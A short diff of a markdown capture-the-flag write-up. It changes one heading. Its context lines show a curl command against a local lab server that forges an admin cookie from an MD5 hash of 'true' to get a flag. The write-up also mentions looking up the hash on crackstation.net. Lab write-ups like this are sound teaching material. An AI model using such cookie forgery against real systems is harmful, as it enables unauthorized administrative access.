@@ -24,7 +24,7 @@ echo -n 'true' | md5sum
 curl -s -H 'Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09' 'http://localhost:9090/index.php' | grep Flag
 ```
 
-## 🧰 Additional Resources
+## 🧰 Additional Resources Used
 We used ```https://crackstation.net/``` to crack the hash. This page doesn't really _crack_ the hash you provide, but performs a lookup on pre-computed hashes instead.
 
 ## 🔧 Fix
